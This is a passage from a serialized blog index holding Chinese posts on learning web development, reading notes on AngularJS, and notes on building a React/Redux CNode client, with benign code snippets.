现在肯学习的孩子太少了, 而且题主才上高中, 太难能可贵了.</li>\n<li>一些注意点, 学习HTML, css, js的时候, 只要有浏览器就够了, 不需要装wamp, 编辑器推荐sublime, 多用google, 多敲代码, 尤其是多敲代码非常重要, 不敲代码你什么都学不会. 其他的想起来再补充吧.</li>\n</ol>\n<p>对于那些说加入xxx阵营的, 不要理他们, 直接在win上面学, php和apache对win的兼容性非常好, 完全可以从入门学到精通都无需碰linux. 当然, 如果你网站最终上线的话, 还是需要接触linux服务器进行部署. 这个到需要部署的时候再说, 提前接触linux就是浪费时间.2014-02-16</p>\n<ol start=\"2\">\n<li>网站开发开发大致分为前端和后端，前台主要负责实现视觉和交互效果，以及与服务器通信，完成业务逻辑。可以按如下思路学习系统学习：\n基础知识：</li>\n<li>html + css 这部分建议在 w3school 在线教程 上学习，边学边练，每章后还有小测试。 之后可以模仿一些网站做些页面。在实践中积累了一些经验后，可以系统的读一两本书，推荐《head first html 与 css 中文版》，这本书讲的太细了，我没能拿出耐心细读。你可以根据情况斟酌。 </li>\n<li>javascript 要学的内容实在很多，如果没有其他编程语言的基础的话，学起来可能要费些力，还是建议先在 w3school上学习。之后建议马上看《javascript语言精粹》，js是一门很混乱的语言，这本书能够帮助你区分哪些是语言的精华，哪些是糟粕，对于语言精华，应该深入学习。糟粕部分能看懂别人写的代码就行，自己就不用尝试了。\n进阶：\n有了以上基础，就可以进行一般的静态网页设计，不过对于复杂的页面还学进一步学习。</li>\n<li>css。必看《精通css》，看完这本书你应该对：盒子模型，流动，block，inline，层叠，样式优先级，等概念非常了解了。作为练习可以看下《css艺门之匠》这本书，它对标题，背景，圆角，导航条，table，表单等主题都有详细的介绍。</li>\n<li>javascript。上面提到内容还不足以让你胜任js编程。在有了基础之后，进一步学习内容包括：</li>\n</ol>\n<p>a) 框架。推荐jQuery，简单易用，我的第一web项目就是在w3school简单学习后，直接上手jQuery完成的，真的很简单，很好用。jQuery适用环境有限，对于那些对性能要求很高的页面无法胜任。推荐了解一下 YUI 或百度的 tangram ，都很好用，学习方法也很简单，照着产品文档做几个页面就行了，不用面面俱到，以后遇到问题查文档就行了。框架可以帮你屏蔽浏览器的差异性，让你能更专注与web开发学习的精髓部分。补充： 可以使用 codecademy 学习 javascript，jQuery，用户体验真的很好（感谢 TonyOuyang ）。 </p>\n<p>b) javascript 语言范式 。这个名字可能并不恰当，只是我找不到可以描述“面向对象”，“函数式”这个两个概念的概念。javascript不完全是一个面向对象的语言，它的很多设计理念都有函数编程语言的影子，甚至说如果你不用面向对象，完全可以把它理解成一门函数式编程语言。javascript的很多语言特性，都是因为他具有函数是语言的特点才存在的。这部分推荐先学习面向对象的基本理论，对封装，继承，多态等概念要理解，维基百科，百度百科会是你的帮手，另外推荐《object oriented javascript》，应该有中文版。对与函数式编程我了解的也不系统，不好多说，可以自己百度一下。</p>\n<p>c) javascript 语言内部机制。必须弄清如下概念：js中变量的作用域，变量传递方式，函数的定义环境与执行环境，闭包，函数的四种调用方式（一般函数，对象的方法，apply，call），以及四种调用方式下，‘this&#39;指向的是谁。这部分内容你会在《javascript语言精粹》中详细了解。另外，你必须理解json。</p>\n<p>d) dom编程，这个web前端工程师的核心技能之一。必读《dom编程艺术》，另外《高性能javascript》这本书中关于dom编程的部分讲的也很好。</p>\n<p>e) ajax编程，这是另一核心技术。ajax建议在网上查些资料，了解这个概念的来龙去脉，百度百科，维基百科上的内容就足够了。真正编程是很容易的，如今几乎所有框架都对ajax有良好的封装，编程并不复杂。</p>\n<p>f) 了解浏览器差异性。这部分包括css和js两部分，浏览器差异内容很多，建议在实践中多多积累。另外对于浏览器的渲染模式，DOCTYPE等内容应该系统学习。\n再进一阶：\n有了以上知识，对于大多数小型网站，你应该已经可以写出能够工作的代码了。但写出可以运行的代码，只是编程的最初级阶段。更高要求大概还有三方面：1易维护，2可测试，3高性能，如果页面流量有要求，那第四个就是，4低流量。</p>\n<ol>\n<li><p>易维护。对于页面你该理解‘样式’，‘数据’，‘行为’三者分离，对应的当然就是css,html,js。对于js代码，你最好了解设计模式，重构，MVC等内容。</p>\n</li>\n<li><p>可测性。js代码可测性的主题，我正在研究，欢迎感兴趣的同学联系我，共同学习</p>\n</li>\n<li><p>高性能。必读《高性能javascript》</p>\n</li>\n<li><p>低流量。技巧性太强，非一朝一夕之功，不多说\n补充：\n对于前段开发，核心部分基本就这些了，可以根据自己的兴趣爱好选择性学习以下内容。</p>\n</li>\n<li><p>美工。 大公司都有专业的美工人员，不过如果爱好也可以了解</p>\n</li>\n<li><p>交互设计。大公司依然有专业人士搞这些，不过如果爱好也可了解。推荐《简约至上》。</p>\n</li>\n<li><p>后端。应该说前段工程师必须至少了解一门后端语言，不过如果爱好也可深入学习，入手难度比较低的应该是php了。这部分由可分为基于页面，基于框架两种。大型项目都是基于框架开发的，建议至少了解一个MVC框架，php的zend，Home : The Official Microsoft ASP.NET Site 的 Home : The Official Microsoft ASP.NET Site mvc等等太多了，好还框架的设计思想都大同小异。</p>\n</li>\n<li><p>flash。我并没有吧flash作为前端工程的核心技能之一，因为我不会，不过ActionScript应该和js大同小异，可以根据工作需要学习。不过我的原则是能不用就尽量不用，其实很多效果通过js，css都可以实现，完全不需要flash。而且随着html5的发展flash早晚会淘汰。</p>\n</li>\n<li><p>html5和css3 。html5的标准到现在还没有正式发布，不过目前几乎所有新的浏览器都已经开始支持，手机上就更是如此，建议学习，很好，很强大。</p>\n</li>\n</ol>\n<p>前端开发需要学习的内容，很多很杂。至于视觉设计，交互设计，产品设计，这些内容，如果感兴趣，可以去了解。技术学习，面要铺开，但深度更重要。</p>\n<p>前端开发需要学习的内容，很多很杂，我在最开始学习的前两个月也是一片迷茫。一路走来，发现也走了些弯路。美工，交互设计，flash，js，html+css，后端，随便哪种技能，如果学的特别牛，都可以保证你拥有一个职业。想通吃，没个几年怕是不成。关键是选准自己的爱好，深入学习一项，面要铺开，但深度更重要。以上我这一年学习经验的总结，希望对你有帮助。</p>\n<ol start=\"3\">\n<li>Nicholas C. Zakas谈怎样才能成为优秀的前端工程师：</li>\n</ol>\n<p>昨天，我负责了Yahoo!公司组织的一次面试活动，感触颇深的是其中的应聘者提问环节。我得说自己对应聘者们提出的大多数问题都相当失望。我希望听到一些对在Yahoo！工作充满激情的问题。在昨天的应聘者中，只有一个人的问题是我认为最好的，那个人问我：“你觉得怎么才能成为优秀的前端工程师？”我觉得很有必要把这个问题从面试房间里拿出来讨论一下。</p>\n<p>首先，前端工程师必须得掌握HTML、CSS和JavaScript。只懂其中一个或两个还不行，你必须对这三门语言都很熟悉。也不是说必须对这三门语言都非常精通，但你至少要能够运用它们完成大多数任务，而无需频繁地寻求别人的帮助。</p>\n<p>优秀的前端工程师应该具备快速学习能力。推动Web发展的技术并不是静止不动的，没错吧？我甚至可以说这些技术几乎每天都在变化，如果没有快速学习能力，你就跟不上Web发展的步伐。你必须不断提升自己，不断学习新技术、新模式；仅仅依靠今天的知识无法适应未来。Web的明天与今天必将有天壤之别，而你的工作就是要搞清楚如何通过自己的Web应用程序来体现这种翻天覆地的变化。</p>\n<p>计算机科学这个大门类下面的许多分支在人们眼中实际上都不外乎科学。但是，我们所说的前端不是什么科学，而是艺术。艺术家不仅要掌握谋生的技术，还要懂得如何运用。对同一个问题的解决方案在这种情况适用，在另一种情况下可能就不适用。对Web应用程序的前端而言，解决同一问题的方案经常会有很多。没有哪个方案是错的，但其中确实有一些是更合适的。优秀的前端工程师应该知道在什么情况下使用哪种方案更合适，而在什么情况下应该重新选择。</p>\n<p>优秀的前端工程师需要具备良好的沟通能力，因为你的工作与很多人的工作息息相关。在任何情况下，前端工程师至少都要满足下列四类客户的需求。</p>\n<ol>\n<li>产品经理——这些是负责策划应用程序的一群人。他们能够想象出怎样通过应用程序来满足用户需求，以及怎样通过他们设计的模式赚到钱（但愿如此）。一般来说，这些人追求的是丰富的功能。</li>\n<li>UI设计师——这些人负责应用程序的视觉设计和交互模拟。他们关心的是用户对什么敏感、交互的一贯性以及整体的好用性。他们热衷于流畅靓丽但并不容易实现的用户界面。</li>\n<li>项目经理——这些人负责实际地运行和维护应用程序。项目管理的主要关注点，无外乎正常运行时间（uptime）——应用程序始终正常可用的时间、性能和截止日期。项目经理追求的目标往往是尽量保持事情的简单化，以及不在升级更新时引入新问题。</li>\n<li>最终用户——当然是应用程序的主要消费者。尽管我们不会经常与最终用户打交道，但他们的反馈意见至关重要；没人想用的应用程序毫无价值。最终用户要求最多的就是对个人有用的功能，以及竞争性产品所具备的功能。</li>\n</ol>\n<p>那么，前端工程师应该最关注哪些人的意见呢？答案是所有这四类人。优秀的前端工程师必须知道如何平衡这四类人的需求和预期，然后在此基础上拿出最佳解决方案。由于前端工程师处于与这四类人沟通的交汇点上，因此其沟通能力的重要性不言而喻。如果一个非常酷的新功能因为会影响前端性能，必须删繁就简，你怎么跟产品经理解释？再比如，假设某个设计如果不改回原方案可能会给应用程序造成负面影响，你怎么才能说服UI设计师？作为前端工程师，你必须了解每一类人的想法从何而来，必须能拿出所有各方都能接受的解决方案。从某种意义上说，优秀的前端工程师就像是一位大使，需要时刻抱着外交官的心态来应对每一天的工作。</p>\n<p>我告诫新来的前端工程师最多的一句话，就是不要在没有作出评估之前就随便接受某项任务。你必须始终记住，一定先搞清楚别人到底想让你干什么，不能简单地接受“这个功能有问题”之类的大概其的说法。而且，你还要确切地知道这个功能或设计的真正意图何在。“加一个按钮”之类的任务并不总意味着你最后会加一个按钮。还可能意味着你会找产品经理，问一问这个按钮有什么用处，然后再找UI设计师一块探讨按钮是不是最佳的交互手段。要成为优秀的前端工程师，这种沟通至关重要。</p>\n<p>无论从哪个方面讲，我都觉得前端工程师是计算机科学职业领域中最复杂的一个工种。绝大多数传统的编程思想已经不适用了，为了在多种平台中使用，多种技术都借鉴了大量软科学的知识和理念。成为优秀前端工程师所要具备的专业技术，涉及到广阔而复杂的领域，这些领域又会因为你最终必须服务的各方的介入而变得更加复杂。专业技术可能会引领你进入成为前端工程师的大门，但只有运用该技术创造的应用程序以及你跟他人并肩协同的能力，才会真正让你变得优秀。</p>\n<p>网页开发涉及的技术有很多方面，如果想深入学习的话，就必须有所取舍，扎实的基本功才是硬道理，正所谓术业有专攻，并不是所有人都是万能的。 \n就像我，从事php等相关开发已经8年了，但是就你所列出来的那些项技能来说我只能说我精通PHP、SQL等，而js之类的并不是我所擅长的，就是如此。 \n闲话少说，来给你梳理一下吧 \n基本上网站制作和开发分为UI、UE、CODE、DB四个部分，这也就是我说的你要选择的学习方向： </p>\n<p>UI指的是网页设计，也就是利用各种素材制作网页的效果图，学习这个需要掌握的就是photoshop、flash、firework之类的工具，当然还要有比较好的审美。 </p>\n<p>UE指的是网页前端及用户体验部分的开发，这一阶段需要掌握的有html和javascript以及css。html是所有网页开发的基础要做到滚瓜烂熟，css的话以我的经验是知道常用的即可，剩下的就是具体问题具体分析了。js则比较麻烦，其实现在大家做网站一般都用jquery这个封装好的js库来做，但是我还是建议新手从js的基本语法开始学起，这样遇到了棘手的麻烦才有章可循，而不是一味的google下jquery的plugin之类的 </p>\n<p>CODE部分也就是编程部分了，既然你已经学了php了，那就继续深入这门语言好了。我做技术总监也有一阵子了，也面试过很多所谓的phper，我承认他们可能会照猫画虎的写些程序，可真的有些人连include和require的区别是什么都说不出来，就更别提什么值引用之类的了。所以我还是强调基本功，基本功是最重要的，否则你永远就是一个堆代码的蓝领工人，永远写不出高级的程序，永远看不懂国外高手写的牛逼程序。学完基本功后接下来的建议就是找一个开源的PHP框架，读懂它的代码。我刚学php的时候还没有什么很好的框架，我是用一个星期的时间把smarty的源代码读了一遍（后来对其作了优化，速度提升30%）。现在的话这种开源框架多如牛毛，随便找个来看就可以，喜欢中文的话可以看thinkphp，喜欢速度的话可以看doophp，老派一点的话可以看cakephp等等等等。等你把某个具体的框架通读一遍下来之后，你就可以出师了，基本可以秒杀市面上80%的所谓PHPer。 </p>\n<p>DB就不多说了，就是数据库层面的，掌握标准的SQL就可以了，做网页的话多了解一些mysql的相关语法和配置什么的也就差不多了。 \n基本也就这些了，看你的学习方向了，祝你早日成功。 </p>\n","index":4},{"filePath":"post\\2017\\7\\17-angualr.md","htmlPath":"/post/2017/7/17-angualr.html","name":"17-angualr.md","type":"md","layout":"post","title":"读《AngularJS深度剖析与最佳实践》","date":"2017/7/17","categories":"Reading","tags":"读书笔记","html":"<p><img src=\"/images/book/angualr-deep-analysics.png\" alt=\"cover\"></p>\n<h3 id=\"组件型指令\">组件型指令</h3>\n<p>对于组件型指令来说，标准的用法是E，但是为了兼容IE8，通\n常也支持一个A，因为IE8 的自定义元素需要先用document.createElement 注册，用A 可\n以省去注册的麻烦。对于组件型指令，更重要的是内容信息的展示，所以我们一般不涉及指令的link 函数，而应该尽量地将业务逻辑放置在Controller 中。</p>\n<h3 id=\"指令scope\">指令scope</h3>\n<p>由于多个装饰器很可能被用于同一个指令，包括独立作用域指令，所以装饰\n器型指令通常不使用新作用域或独立作用域。如果要访问绑定属性，该怎么做呢？仍然看\n前面的例子\n<code>&lt;user-details name=&quot;test&quot; details=&quot;details&quot; on-update=&quot;updateIt(times)&quot;&gt;&lt;/userdetails&gt;</code>，\n假如不使用独立作用域，我们该如何获取这些属性的值呢？\n●对于 @ 型的绑定，我们可以直接通过 attrs 取到它：attrs.name 等价于 name: &#39;@&#39;。\n● 对于 = 型的绑定，我们可以通过 scope.$eval 取到它：scope.$eval(attrs.details) 等价</p>\n<p> {%  asset_img 2.png section %}</p>\n<h3 id=\"过滤器\">过滤器</h3>\n<p>过滤器还可以接收第二个参数，乃至第N个参数，如：<code>return function(input, arg1, arg2, arg3){...};</code>,而使用者则通过</p>\n<pre><code>{{1|myFilter:2:3:4}}</code></pre><p>的形式调用它。这种情况下，arg1 的值为2，arg2的值为3，arg3 的值为4。</p>\n<h3 id=\"服务\">服务</h3>\n<p>除了Constant 外，所有这些类型的服务，背后都是通过Provider 实现的，我们可以把它们看做让Provider 更容易写的语法糖。</p>\n<p>Angular 提供了这么多种形式的服务，那么我们在工程实践中该如何选择？我们可以遵\n循下列决策流程：</p>\n<p>● 需要全局的可配置参数？用 Provider。</p>\n<p>● 是纯数据，没有行为？用 Value。</p>\n<p>● 只 new 一次，不用参数？用 Service。</p>\n<p>● 拿到类，我自己 new 出实例？用 Factory。</p>\n<p>● 拿到函数，我自己调用？用 Factory。</p>\n<p>但是，还有另一种更加敏捷的方式：\n●是纯数据时，先用 Value ；当发现需要添加行为时，改写为 Service ；或当发现需\n要通过计算给出结果时，改写为Factory ；当发现需要进行全局配置时，改写为Provider。</p>\n<p>● 最酷的是，这个过程对于使用者是透明的—它不需要因为实现代码的改动而更改\n原有代码。如上面Value 和Factory 的使用代码，仅仅从使用代码中我们区分不出\n它是Value 还是Factory。</p>\n<p>接下来，我们来看Constant。与其他Service 不同，Constant 不是Provider 函数的语法\n糖。更重要的差别是，它的初始化时机非常早，可以在angular.module(&#39;com.ngnice.app&#39;).\nconfig 函数中使用，而其他的服务是不能被注入到config 函数中的。这也意味着，如果你\n需要在config 中使用一个全局配置项，那么它就只能声明为常量，而不能声明为变量。\n在官方的开发指南中，给出了一个完整的对比表，见表2-1。</p>\n<p>{% asset_img service-kind.png service-kind  %}</p>\n<p>由于 Factory 可以根据程序逻辑返回不同的数据类型，所以我们无法推断其结果是什么类型，也就是对类型不够友好。Provider 由于其灵活性比Factory 更高，因此在类型友好性上和\nFactory 是一样的。</p>\n<p>● 在 config 阶段可用：只有 Constant 和 Provider 类型在 config 阶段可用，其他都是\nProvider 实例化之后的结果，所以只有config 阶段完成后才可用。由于Service 是new 出来的，所以其结果必然是类实例，\n也就无法直接返回一个可供调用的函数或数字等原生对象。\n如果你确实需要对一个没有提供Provider 的第三方服务进行配置，该怎么办呢？\nAngular 提供了另一种机制：decorator。</p>\n<h3 id=\"angualr-mvc\">angualr mvc</h3>\n<p>  {% asset_img mvc.png mvc  %}</p>\n<h3 id=\"angular启动过程\">angular启动过程</h3>\n<p>  {% asset_img start-process.png start-process  %}</p>\n<h3 id=\"依赖注入\">依赖注入</h3>\n<p>  {% asset_img 1.png section  %}</p>\n<h3 id=\"浏览事件循环\">浏览事件循环</h3>\n<p>  {% asset_img event-loop.png loop  %}</p>\n<h3 id=\"指令生命周期\">指令生命周期</h3>\n<p>  {% asset_img directive-life-cycle.png cycle  %}</p>\n<h3 id=\"one-time绑定\">one-time绑定</h3>\n<p>  {% asset_img 3.png section  %}\n  {% asset_img 4.png section  %}</p>\n<h3 id=\"滚屏加载\">滚屏加载</h3>\n<p>  {% asset_img 5.png section  %}</p>\n<p><a href=\"http://sroze.github.io/ngInfiniteScroll/index.html\">http://sroze.github.io/ngInfiniteScroll/index.html</a></p>\n<p>get可以用来取本地文件，其他不可以</p>\n<h3 id=\"js-object-layout\">js object layout</h3>\n<p> {% asset_img js-obj-layout.png.png js-obj-layout  %}</p>\n<h3 id=\"其他\">其他</h3>\n<p>  {% asset_img 7.png section  %}</p>\n<h3 id=\"anchorscroll服务\">$anchorScroll服务</h3>\n<p>  {% asset_img 8.png section  %}</p>\n<h3 id=\"ngrepeat验证失败-，简单的验证显示\">ngRepeat验证失败 ，简单的验证显示</h3>\n<p>  {% asset_img 9.png section  %}</p>\n<h3 id=\"复杂的验证显示\">复杂的验证显示</h3>\n<p>  {% asset_img 10.png section  %}</p>\n<h3 id=\"ngrepeat报重复内容错误\">ngRepeat报重复内容错误</h3>\n<p>  {% asset_img 11.png section  %}\n  {% asset_img 12.png section  %}</p>\n<h3 id=\"优化\">优化</h3>\n<ol>\n<li><p>代码里很多和界面无交互的函数和变量都挂在$scope上面</p>\n<p>$scope是数据展示和各种事件的载体。与展示、交互行为无关的数据和方法最好不要挂载到$scope上，保持$scope的纯粹。\n参考链接\n<a href=\"https://github.com/atian25/blog/issues/5\">保持$scope的纯粹</a></p>\n</li>\n<li><p>避免深度watch， 即第三个参数为true.\n参考《mastering web application development with angularjs》 P313</p>\n<p>{% asset_img avoid-deep-watch.png avoid-deep-watch %}</p>\n</li>\n</ol>\n<ol start=\"3\">\n<li><p>及时移除不必要的$watch</p>\n<pre><code class=\"language-javascript\">var watchFn = $scope.$watch(&#39;cycle&#39;, changeCycle);\n\nwatchFn();//移除watch</code></pre>\n</li>\n<li><p>减少watch的变量长度，例如对双向绑定的变量用标签例如<span>包起来</p>\n<p>{% asset_img shorten-watch.png shorten-watch %}</p>\n</li>\n<li><p>ng-repeat使用 track by</p>\n<p>刷新数据时，我们常这么做：$scope.tasks = data || [];，这会导致angular移除掉所有的DOM，重新创建和渲染。</p>\n<p>若优化为ng-repeat=&quot;task in tasks track by task.id后，angular就能复用task对应的原DOM进行更新，减少不必要渲染。</p>\n</li>\n<li><p>列表对象的数据转换，在放入scope之前处理</p>\n<p>如$scope.dataList = convert(dataFromServer)</p>\n</li>\n</ol>\n","index":5},{"filePath":"post\\2017\\9\\25-react-cnode-guide.md","htmlPath":"/post/2017/9/25-react-cnode-guide.html","name":"25-react-cnode-guide.md","type":"md","layout":"post","title":"react-cnode实践笔记","date":"2017/9/25","categories":"Experience","tags":"专题探究","html":"<p>参照源码</p>\n<p><a href=\"http://react-china.org/t/webpack-react-react-router-redux-less-flex-css-es6-react-cnode/6332\">http://react-china.org/t/webpack-react-react-router-redux-less-flex-css-es6-react-cnode/6332</a></p>\n<p>这里面写得有点乱，看不太明白，所以自己学着边学边做,项目地址</p>\n<p><a href=\"https://github.com/LRY1994/react-cnode-re\">https://github.com/LRY1994/react-cnode-re</a></p>\n<h3 id=\"搭建步骤\">搭建步骤</h3>\n<p>1.搭建react项目结构，直接用官网的方法 create-react-app react-cnode-re</p>\n<p>2.添加less配置\n使用create-react-app 创建的项目默认不支持less，按照<a href=\"https://segmentfault.com/a/1190000010162614%E9%85%8D%E7%BD%AE\">https://segmentfault.com/a/1190000010162614配置</a></p>\n<h3 id=\"用到的知识点\">用到的知识点</h3>\n<p>1.react小书，里面讲得很通俗易懂 <a href=\"http://huziketang.com/books/react/\">http://huziketang.com/books/react/</a></p>\n<p>2.布局使用flex.css，移动端flex布局神器，兼容微信，UC，webview等移动端主流浏览器08.10</p>\n<p>npm install flex.css –save</p>\n<p>flex.css使用方法</p>\n<pre><code>dir：主轴方向\n        top：从上到下\n        right：从右到左\n    bottom：从上到下\n    left：从左到右（默认）\nmain：主轴对齐方式\n    right：从右到左\n    left：从左到右（默认）\n    justify：两端对齐\n        center：居中对齐\ncross：交叉轴对齐方式\n    top：从上到下\n    bottom：从上到下\n    baseline：跟随内容高度对齐\n    center：居中对齐\n    stretch：高度并排铺满（默认）\nbox：子元素设置\n    mean：子元素平分空间\n    first：第一个子元素不要多余空间，其他子元素平分多余空间\n    last：最后一个子元素不要多余空间，其他子元素平分多余空间\n    justify：两端第一个元素不要多余空间，其他子元素平分多余空间</code></pre><p>3.整个项目的基础结构就是</p>\n<pre><code>&lt;Provider store={store}&gt;\n    &lt;Router history={history}&gt;\n        &lt;Switch&gt;\n            &lt;Route key=’’ path=’’ component=’’/&gt;\n            &lt;Route key=’’ path=’’ component=’’/&gt;\n            ………………………………..\n        &lt;/Switch&gt;\n    &lt;/Router&gt;\n&lt;/Provider&gt;</code></pre><p>4.下拉动态加载用到时 get-next-page 插件</p>\n<p>她自己自动监听了这些事件，不用自己写触发事件，比如下拉的时候回自动拉取下一页数据</p>\n<p>this.monitorEvent = [&#39;DOMContentLoaded&#39;, &#39;load&#39;, &#39;click&#39;, &#39;touchstart&#39;, &#39;touchend&#39;, &#39;haschange&#39;, &#39;online&#39;, &#39;pageshow&#39;, &#39;popstate&#39;, &#39;resize&#39;, &#39;storage&#39;, &#39;mousewheel&#39;, &#39;scroll&#39;];</p>\n<p>只需要写好el,拉取的数据就会放在el </p>\n<p>使用方法：</p>\n<pre><code>import GetNextPage from ‘get-next-page’\nnew GetNextPage(el,setting)\n\n\nsetting参数如下\n\n/*元素在可视区位置，符合其中一个条件就会触发加载机制*/\n\ntop    //元素在顶部伸出的距离才加载\nright  //元素在右边伸出的距离才加载\nbottom //元素在底部伸出的距离才加载\nleft   //元素在左边伸出的距离才加载\n\n    /*\n    发送到服务器的相关数据\n*/\nurl  //发送到服务器的地址\ndata //发送到服务器的数据\npageName  //分页的参数名称，用来加载完成后+1\n/*\n    回调方法\n*/\nstart  //开始加载时调用方法\nload //加载成功时调用方法\nerror  //开始加载时调用方法\nend  //加载完成时调用方法   </code></pre><h3 id=\"遇到的问题及得到的知识点\">遇到的问题及得到的知识点</h3>\n<p>1.You should not use <Route> or withRouter() outside a <Router></p>\n<p>源码里面是每个路由导航的Component都包含一个Rooter，我想要整个页面就用一个Footer，但是Footer里面包含了<Route>,<Route>必须包含 在<Rooter>里面，所以不可以这样写</p>\n<pre><code>render(\n&lt;Provider store={store}&gt;\n        &lt;div&gt;\n        {router}\n        &lt;Footer/&gt;\n    &lt;/div&gt;\n\n&lt;/Provider&gt;,\ndocument.getElementById(&#39;root&#39;)\n)</code></pre><p>2.React.Children.only expected to receive a single React element child.</p>\n<pre><code>&lt;Router&gt;&lt;Provider&gt;里面只能有一个一级子节点,Provider的store是必须的，Router的history是必须的</code></pre><p>History用这种方法创造</p>\n<pre><code>import createBrowserHistory from &#39;history/createBrowserHistory&#39;;\nconst history = createBrowserHistory();</code></pre><p>好像还可以这样写。但是不知道有什么区别</p>\n<pre><code>var history = process.env.NODE_ENV !== &#39;production&#39; ? browserHistory : hashHistory;</code></pre><p>3.修改react启动的端口号</p>\n<p>打开react项目的 package.json文件</p>\n<p>将 scripts中的start键值对</p>\n<pre><code>&quot;start&quot;: &quot;node scripts/start.js&quot;,</code></pre><p>修改为\n    &quot;start&quot;: &quot;set PORT=3000&amp;&amp;node scripts/start.js&quot;,</p>\n<p>4.React并没有一个自己的Component处理网络请求，自己包装HttpService.js</p>\n<p>5.render 方法必须要返回一个 JSX 元素。而且必须要用一个外层的 JSX 元素把所有内容包裹起来。返回并列多个 JSX 元素是不合法的</p>\n<p>6.{this.props.children}相当于angular的<ui-view></p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/1.jpg\" alt=\"Aaron Swartz\"></p>\n<p>参考 <a href=\"https://segmentfault.com/q/1010000009616045\">https://segmentfault.com/q/1010000009616045</a></p>\n<p>react-router4没有indexRoute了。 react-router4版本中路由的本质变成了React组件，也就是自定义标签。所以你可以像使用组件一样是用路由。那么嵌套路由无非就是组件嵌套的写法（自定义标签嵌套而已）</p>\n<p>7.</p>\n<pre><code>&lt;Route path=&quot;/&quot; component={App} /&gt;\n&lt;Route exact path=&quot;/&quot; component={Home} /&gt;\n&lt;Route path=&quot;topics&quot; component={Topics} /&gt;\n&lt;Route path=&quot;/topics/:id&quot; component={Topic} /&gt;</code></pre><p>这里用react-router-dom，用{this.props.children}渲染不出组件，放弃这种做法</p>\n<p>8.没有传入action 之前，会出现这个错误</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/2.jpg\" alt=\"Aaron Swartz\"></p>\n<p>9.想要在chrome控制台下查看react,出现这个问题</p>\n<p>proxyConsole.js:56 The previous state received by the reducer has unexpected type of &quot;Function&quot;. Expected argument to be an object with the following keys: &quot;User&quot;</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/3.jpg\" alt=\"Aaron Swartz\"></p>\n<p>原因见以下链接</p>\n<p><a href=\"https://stackoverflow.com/questions/38074154/redux-the-previous-state-received-by-the-reducer-has-unexpected-type-of-functi\">https://stackoverflow.com/questions/38074154/redux-the-previous-state-received-by-the-reducer-has-unexpected-type-of-functi</a></p>\n<p>改成</p>\n<pre><code>const store = createStore(\n    combineReducers(reducer),\n    compose(applyMiddleware(thunk),composeWithDevTools())    \n);</code></pre><p>10.在reducer里面返回新的state,就是store</p>\n<p>reducer只有在createStore的时候用到，其他地方没有用到，不用管。</p>\n<p>Connet的时候就是组件丛store里面取出自己需要的东西，仅仅是自己需要的数据。</p>\n<p>只有触发的时候用到dispatch，其他时候没有用到。</p>\n<p>刚开始想像一般推荐的那种方法那样弄两个文件夹Component和Container，试了一天，最后发现store是放共享的东西，我为什么什么都要往里面放。还有一个组件写两个文件很繁琐，直接像源码里面在组件最后connect一下就好了</p>\n<p>总体流程就是</p>\n<pre><code>Reducer\ncreateStore(reducer)\naction\nconnect(props,action)\nthis.props.（action.type）(arg)\n\n手动调用this.props.（action.type）(arg)--&gt;react-redux自动对应到reducer--&gt;react-redux自动更新props</code></pre><p>11.前往某个制定的页面</p>\n<pre><code>this.context.router.history.push({\n                    pathname: &#39;/user/&#39; + res.loginname\n                });</code></pre><p>12.mapDispatchToProps可以返回一个对象，action(&#39;User&#39;)返回对象,每个元素都是函数</p>\n<pre><code>{\n    &#39;signinSuccess&#39;:( target)=&gt;{\n        _ID: User, \n        target: target, \n        type: &#39;signinSuccess&#39; \n},\n&#39;signin&#39;: ( target)=&gt;{\n        _ID: User, \n        target: target, \n        type: &#39;signin&#39;\n},\n‘setState’: ( target)=&gt;{\n        _ID: User, \n        target: target, \n        type: ‘setState’\n},\n}\n\n\nexport default (_ID) =&gt; {\n    var action = {};\n    var arr = [\n        &#39;signinSuccess&#39;, //登录成功\n        &#39;signin&#39;, //退出登录\n        &#39;setState&#39; //设置状态\n    ];\n\n    for (let i = 0; i &lt; arr.length; i++) {\n        action[arr[i]] = (target) =&gt; {\n            return { \n                _ID: _ID, \n                target: target, \n                type: arr[i] \n            };\n        }\n    }\n\n    return action;\n} \n\n\nexport default connect((state) =&gt; { return { User: state.User }; }, action(&#39;User&#39;))(SignIn); //连接redux\n\nconnect([mapStateToProps], [mapDispatchToProps], [mergeProps], [options])(组件)</code></pre><p>[mapDispatchToProps(dispatch, [ownProps]): dispatchProps] (Object or Function): 如果传递的是一个对象，那么每个定义在该对象的函数都将被当作 Redux action creator，而且这个对象会与 Redux store 绑定在一起，其中所定义的方法名将作为属性名，合并到组件的 props 中。</p>\n<p>13.在signin里面不connect的时候super(props)输出来的props是这样的，默认的props是 \n<img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/4.jpg\" alt=\"Aaron Swartz\"></p>\n<pre><code>history:\n    action:&quot;POP&quot;/&quot;PUSH&quot;\n    block:ƒ block()\n    createHref:ƒ createHref(location)\n    go:ƒ go(n)\n    goBack:ƒ goBack()\n    goForward:ƒ goForward()\n    length:2//浏览器历史列表中的 URL 数量\n    listen:ƒ listen(listener)\n    location:{\npathname: &quot;/signin&quot;, //同window.location.pathname\nsearch: &quot;&quot;, //同window.location.search\nhash: &quot;&quot;, \nstate: undefined,// 一个捆绑在这个地址上的object对象\nkey: &quot;wytc8y&quot;}\n    push:ƒ push(path, state)\n    replace:ƒ replace(path, state)\nlocation:和history.location内容一样\nmatch:\n    isExact:true //路由extract设置为true\n    params:{}\n    path:&quot;/signin&quot;\n    url:&quot;/signin&quot;\nstaticContext:undefined</code></pre><p>connect之后多了User,和三个action setState,signin,signinSuccess</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/5.jpg\" alt=\"Aaron Swartz\"></p>\n<p>我把default改成return null,User值会变化\n<img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/6.png\" alt=\"Image text\">\n<img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/7.png\" alt=\"Aaron Swartz\"></p>\n<p>User为什么在props上？因为connect的时候取名叫做User</p>\n<p><img src=\"https://raw.githubusercontent.com/LRY1994/react-cnode-re/master/pictrue_for_readme/8.png\" alt=\"Aaron Swartz\"></p>\n<p>14.在user 